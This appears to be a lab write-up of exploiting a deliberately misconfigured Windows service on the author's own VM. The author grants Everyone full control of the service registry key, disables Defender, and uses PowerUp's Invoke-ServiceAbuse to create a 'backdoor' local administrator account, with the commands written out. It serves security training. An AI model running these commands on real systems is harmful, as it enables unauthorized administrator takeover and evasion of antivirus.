# Insecure Windows Service Exploitation — Steps Summary

**Machine used:** 1 Windows 10 VM (Administrator access)
**Tools used:** Dev-C++, PowerShell, PowerUp.ps1

---

## Step 1: Create the dummy malware executable
- Wrote `dummymalware.cpp` (see attached file) — a simple C++ program that displays a MessageBox
- Compiled it using Dev-C++ into `dummymalware.exe`
- Copied `dummymalware.exe` to `C:\Windows\System32\`

---

## Step 2: Create the insecure service script
- Wrote `insecureservice.ps1` (see attached file)
- The script:
  1. Creates a new Windows service named `InsecureService` pointing to `dummymalware.exe`
  2. Modifies the service's registry key permissions (`HKLM:\SYSTEM\CurrentControlSet\Services\InsecureService`) to grant **FullControl** to the **Everyone** group — making the service insecure and modifiable by any user

---

## Step 3: Execute the script
```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
cd C:\Users\<username>\Desktop
.\insecureservice.ps1
```
**Result:** `InsecureService has been created with insecure permissions!`

**Verified with:**
```powershell
Get-Service -Name InsecureService
```
Output confirmed the service exists (Status: Stopped, which is expected — the service does not need to be running for the vulnerability to be exploitable).

---

## Step 4: Prepare PowerUp.ps1
- Disabled Windows Defender Real-time protection temporarily (required, since Defender flags PowerUp.ps1 as a hack tool)
- Downloaded `PowerUp.ps1` from the PowerSploit repository (Privesc folder)
- Unblocked and imported the module:
```powershell
Unblock-File -Path .\PowerUp.ps1
Import-Module .\PowerUp.ps1
```

---

## Step 5: Identify the vulnerable service
```powershell
Get-ModifiableServiceFile
Get-ServiceDetail -Name "InsecureService"
```
**Output confirmed:**
```
Name       : InsecureService
StartMode  : Auto
State      : Stopped
Status     : OK
```
This proves PowerUp.ps1 successfully recognized and read the misconfigured service.

---

## Step 6: Exploit the insecure service
```powershell
Invoke-ServiceAbuse -Name InsecureService -UserName backdoor -Password password -LocalGroup "Administrators"
```
This executed the underlying command:
```
net user backdoor password /add && net localgroup Administrators backdoor /add
```

---

## Step 7: Validate the privilege escalation
```powershell
net user backdoor
```
**Confirmed output:**
```
User name              backdoor
Account active          Yes
Local Group Memberships   *Administrators   *Users
```
This confirms the `backdoor` account was successfully created and added to the local Administrators group — full proof of unauthorized privilege escalation via the insecure service permissions.
